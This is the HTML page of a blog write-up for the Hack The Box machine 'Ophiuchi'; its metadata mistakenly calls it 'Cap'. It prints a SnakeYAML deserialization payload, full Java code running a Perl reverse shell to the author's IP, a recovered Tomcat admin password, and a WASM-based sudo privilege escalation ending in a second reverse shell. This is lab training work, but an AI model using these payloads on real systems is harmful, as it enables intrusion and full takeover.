@@ -1,0 +1,925 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB: Ophiuchi Writeup - Alex Loney</title>
+<meta name="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+  <meta name="author" content="Alex Loney">
+  
+  <meta property="article:author" content="Alex Loney">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Alex Loney">
+<meta property="og:title" content="HTB: Ophiuchi Writeup">
+<meta property="og:url" content="/blog/writeup/htb/htb-ophiuchi/">
+
+
+  <meta property="og:description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-07T23:15:00-07:00">
+
+
+
+
+
+
+<link rel="canonical" href="/blog/writeup/htb/htb-ophiuchi/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Alex Loney Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Alex Loney
+          
+        </a>
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/posts/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/bio-photo.jpg" alt="Alex Loney" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">Alex Loney</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Software Engineer by trade and passion, everything else by curiosity</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="https://alexloney.com" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB: Ophiuchi Writeup">
+    <meta itemprop="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+    <meta itemprop="datePublished" content="2021-06-07T23:15:00-07:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="/blog/writeup/htb/htb-ophiuchi/" class="u-url" itemprop="url">HTB: Ophiuchi Writeup
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</p>
+
+<hr>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap -sC -sV -oA nmap/ophiuchi 10.10.10.227
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-11 15:39 EDT
+Nmap scan report for 10.10.10.227
+Host is up (0.078s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
+|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
+|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
+
+</code></pre></div></div>
+
+<p>Port 8080 is running a tomcat server with a YAML parser, but when you use it, you receive:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Due to security reason this feature has been temporarily on hold. We will soon fix the issue!
+</code></pre></div></div>
+
+<p>However, it turns out that it’s actually performing the deserialization and simply not displaying the result</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> curl -i -X POST -d 'data=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://10.10.14.204/test"]]]]' http://10.10.10.227:8080/yaml/Servlet
+</code></pre></div></div>
+
+<p>After a bit of research, I located <a href="">this repository</a> which has a decent example of a serialization attack. Cloning the repository and creating the following setup:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>tree
+<span class="nb">.</span>
+├── README.md
+├── src
+│   ├── artsploit
+│   │   ├── AwesomeScriptEngineFactory.class
+│   │   └── AwesomeScriptEngineFactory.java
+│   └── META-INF
+│       └── services
+│           └── javax.script.ScriptEngineFactory
+└── yaml-payload.jar
+</code></pre></div></div>
+
+<p>I was able to craft the following Java code to execute a Perl reverse shell</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">artsploit</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.script.ScriptEngine</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.script.ScriptEngineFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.concurrent.*</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AwesomeScriptEngineFactory</span> <span class="kd">implements</span> <span class="nc">ScriptEngineFactory</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedWriter</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileWriter</span><span class="o">(</span><span class="s">"/tmp/rshell82.pl"</span><span class="o">));</span>
+            <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="s">"use Socket;$i=\"10.10.14.204\";$p=82;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};"</span><span class="o">);</span>
+            <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"perl /tmp/rshell82.pl"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getEngineName</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getEngineVersion</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">getExtensions</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">getMimeTypes</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">getNames</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getLanguageName</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getLanguageVersion</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">Object</span> <span class="nf">getParameter</span><span class="o">(</span><span class="nc">String</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getMethodCallSyntax</span><span class="o">(</span><span class="nc">String</span> <span class="n">obj</span><span class="o">,</span> <span class="nc">String</span> <span class="n">m</span><span class="o">,</span> <span class="nc">String</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getOutputStatement</span><span class="o">(</span><span class="nc">String</span> <span class="n">toDisplay</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getProgram</span><span class="o">(</span><span class="nc">String</span><span class="o">...</span> <span class="n">statements</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">ScriptEngine</span> <span class="nf">getScriptEngine</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>To execute this, I had to host an HTTP server:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 81
+Serving HTTP on 0.0.0.0 port 81 <span class="o">(</span>http://0.0.0.0:81/<span class="o">)</span> ...
+10.10.10.227 - - <span class="o">[</span>12/Jun/2021 00:42:32] <span class="s2">"HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1"</span> 200 -
+10.10.10.227 - - <span class="o">[</span>12/Jun/2021 00:42:32] <span class="s2">"GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1"</span> 200 -
+10.10.10.227 - - <span class="o">[</span>12/Jun/2021 00:42:33] <span class="s2">"GET /artsploit/AwesomeScriptEngineFactory.class HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<p>And catch the reverse shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>rlwrap nc <span class="nt">-lvnp</span> 82
+listening on <span class="o">[</span>any] 82 ...
+connect to <span class="o">[</span>10.10.14.204] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227] 36388
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+tomcat
+</span></code></pre></div></div>
+
+<p>Success! We now have a working shell!!</p>
+
+<p>Since this is a tomcat instance, the first thing I checked was <code class="language-plaintext highlighter-rouge">conf/tomcat-users.xml</code> for the password</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/&gt;
+</code></pre></div></div>
+
+<p>Checking that via SSH, we have successful login with <code class="language-plaintext highlighter-rouge">admin:whythereisalimit</code>!!</p>
+
+<h1 id="privesc">Privesc</h1>
+
+<p>It looks like there’s an interesting tool we may execute</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+</code></pre></div></div>
+
+<p>So we can run the <code class="language-plaintext highlighter-rouge">index.go</code> program, looking at it, it contains the following interesting lines:</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+        <span class="s">"fmt"</span>
+        <span class="n">wasm</span> <span class="s">"github.com/wasmerio/wasmer-go/wasmer"</span>
+        <span class="s">"os/exec"</span>
+        <span class="s">"log"</span>
+<span class="p">)</span>
+
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">bytes</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">ReadBytes</span><span class="p">(</span><span class="s">"main.wasm"</span><span class="p">)</span>
+
+        <span class="n">instance</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">NewInstance</span><span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+        <span class="k">defer</span> <span class="n">instance</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
+        <span class="n">init</span> <span class="o">:=</span> <span class="n">instance</span><span class="o">.</span><span class="n">Exports</span><span class="p">[</span><span class="s">"info"</span><span class="p">]</span>
+        <span class="n">result</span><span class="p">,</span><span class="n">_</span> <span class="o">:=</span> <span class="n">init</span><span class="p">()</span>
+        <span class="n">f</span> <span class="o">:=</span> <span class="n">result</span><span class="o">.</span><span class="n">String</span><span class="p">()</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">!=</span> <span class="s">"1"</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Not ready to deploy"</span><span class="p">)</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Ready to deploy"</span><span class="p">)</span>
+                <span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"deploy.sh"</span><span class="p">)</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>
+                <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+                        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+                <span class="p">}</span>
+                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So, it loads a <code class="language-plaintext highlighter-rouge">main.wasm</code> file, pulls an <code class="language-plaintext highlighter-rouge">info</code> exported function from it and executes it, then checks the return value to see if it is <code class="language-plaintext highlighter-rouge">1</code>. If it is <code class="language-plaintext highlighter-rouge">1</code>, it then executes <code class="language-plaintext highlighter-rouge">/bin/sh deploy.sh</code>.</p>
+
+<p>The good news about the above is that there are no paths specified, meaning that it will pull from the current working directory. So if we can get <code class="language-plaintext highlighter-rouge">info()</code> to return <code class="language-plaintext highlighter-rouge">1</code>, we should be good.</p>
+
+<p>Additionally, in the directory where <code class="language-plaintext highlighter-rouge">index.go</code> is located, there’s a <code class="language-plaintext highlighter-rouge">main.wasm</code> file. Lets see if we can just execute using it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cp /opt/wasm-functions/main.wasm .
+admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Not ready to deploy
+</code></pre></div></div>
+
+<p>No such luck, it looks like the <code class="language-plaintext highlighter-rouge">main.wasm</code> file is not returning <code class="language-plaintext highlighter-rouge">1</code>.</p>
+
+<p>We have a few options</p>
+<ol>
+  <li>We can try to craft our own <code class="language-plaintext highlighter-rouge">wasm</code> file that exports a <code class="language-plaintext highlighter-rouge">info</code> function and return <code class="language-plaintext highlighter-rouge">1</code> from it</li>
+  <li>We can try to edit the existing <code class="language-plaintext highlighter-rouge">main.wasm</code> file to adjust <code class="language-plaintext highlighter-rouge">info</code> to return <code class="language-plaintext highlighter-rouge">1</code>.</li>
+</ol>
+
+<p>Since I’ve never crafted a <code class="language-plaintext highlighter-rouge">wasm</code> file before, I opted to go for the second option. It looks like we can disasemble <code class="language-plaintext highlighter-rouge">wasm</code> into an editable format using <a href="https://github.com/webassembly/wabt">wabt</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/WebAssembly/wabt.git
+<span class="nv">$ </span><span class="nb">cd </span>wabt
+<span class="nv">$ </span>git submodule update <span class="nt">--init</span>
+<span class="nv">$ </span><span class="nb">mkdir </span>build
+<span class="nv">$ </span><span class="nb">cd </span>build
+<span class="nv">$ </span>cmake <span class="nt">-DBUILD_TESTS</span><span class="o">=</span>OFF .. 
+<span class="nv">$ </span>cmake <span class="nt">--build</span> <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>After successfully building, we can use <code class="language-plaintext highlighter-rouge">wasm2wat</code> to decompile the <code class="language-plaintext highlighter-rouge">wasm</code> file and <code class="language-plaintext highlighter-rouge">wat2wasm</code> to compile it back into a <code class="language-plaintext highlighter-rouge">wasm</code> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>scp admin@10.10.10.227:/opt/wasm-functions/main.wasm <span class="nb">.</span>
+<span class="nv">$ </span>wabt/bin/wasm2wat main.wasm <span class="nt">-o</span> main.wat
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">wat</code> file is pretty straightforward</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 0)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export "memory" (memory 0))
+  (export "info" (func $info))
+  (export "__data_end" (global 1))
+  (export "__heap_base" (global 2)))
+</code></pre></div></div>
+
+<p>With a minor tweak to it, we can change the return value of <code class="language-plaintext highlighter-rouge">$info</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 1)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export "memory" (memory 0))
+  (export "info" (func $info))
+  (export "__data_end" (global 1))
+  (export "__heap_base" (global 2)))
+</code></pre></div></div>
+
+<p>Now, reassembling the file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wabt/bin/wat2wasm main.wat <span class="nt">-o</span> main.wasm
+<span class="nv">$ </span>scp main.wasm admin@10.10.10.227:/tmp/
+</code></pre></div></div>
+
+<p>Now that we have the changed <code class="language-plaintext highlighter-rouge">main.wasm</code> ready, lets craft a simple reverse shell payload and execute the <code class="language-plaintext highlighter-rouge">index.go</code> script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>deploy.sh 
+<span class="c">#!/bin/bash</span>
+
+perl <span class="nt">-e</span> <span class="s1">'use Socket;$i="10.10.14.204";$p=83;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+</code></pre></div></div>
+
+<p>Catching the reverse shell with a netcat listener:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>rlwrap nc <span class="nt">-lnvp</span> 83
+listening on <span class="o">[</span>any] 83 ...
+connect to <span class="o">[</span>10.10.14.204] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227] 36116
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="c"># </span>
+</code></pre></div></div>
+
+<p>Success!! We have root!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-medium" class="page__taxonomy-item p-category" rel="tag">htb medium</a><span class="sep">, </span>
+    
+      <a href="/tags/#offsec" class="page__taxonomy-item p-category" rel="tag">offsec</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#blog" class="page__taxonomy-item p-category" rel="tag">blog</a><span class="sep">, </span>
+    
+      <a href="/categories/#htb" class="page__taxonomy-item p-category" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/categories/#writeup" class="page__taxonomy-item p-category" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-06-07T23:15:00-07:00">June 7, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HTB%3A+Ophiuchi+Writeup%20%2Fblog%2Fwriteup%2Fhtb%2Fhtb-ophiuchi%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-ophiuchi%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-ophiuchi%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/blog/writeup/htb/htb-cap/" class="pagination--pager" title="HTB: Cap Writeup
+">Previous</a>
+    
+    
+      <a href="/blog/writeup/htb/htb-spectra/" class="pagination--pager" title="HTB: Spectra Writeup
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You May Also Enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-trick/" rel="permalink">HTB: Trick Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Trick. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-dynstr/" rel="permalink">HTB: Dynstr Writeup
+</a>
